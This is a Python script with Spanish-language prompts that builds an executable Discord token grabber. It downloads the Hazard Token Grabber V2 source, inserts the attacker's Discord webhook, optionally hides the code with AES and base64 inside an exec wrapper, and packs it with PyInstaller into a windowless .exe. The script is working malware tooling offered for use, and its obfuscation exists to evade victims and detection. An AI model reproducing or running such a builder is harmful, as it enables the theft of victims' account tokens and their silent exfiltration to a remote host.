import os, sys, shutil, requests, base64, random
from time import sleep
from Crypto.Cipher import AES
from Crypto import Random
from pystyle import Colors
def tortuga(_str):
    for letra in _str:
        sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
def create_grabber():
    webhookUrl = input(f"\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Webhook: {Colors.white}")
    if "https://discord.com/api/webhooks" in webhookUrl:
        fileName = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Nombre del archivo: {Colors.white}")
        print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Escribiendo codigo...")
        sleep(.3)
    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", webhookUrl) #Rdimo token grabber
    with open(f"{fileName}.py", 'w', errors="ignore") as f:
        f.write(code)

    tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
    yesno = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.purple}n: {Colors.white}')
    if yesno.lower() == "y" or siono.lower() == "yes":
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{fileName}.py') as f: 
            _file = f.read()
            imports = ''
            input_file = _file.splitlines()
            for i in input_file:
                if i.startswith("import") or i.startswith("from"):
                    imports += i+';'

        with open(f'{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())

    print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Un momento estamos contruyendo {fileName}.exe, esto tomara unos minutos. {Colors.gray}\n")
    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
    try:
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}] EL archivo {Colors.light_red}{fileName}.exe{Colors.purple} ha sido creado correctamente\n")
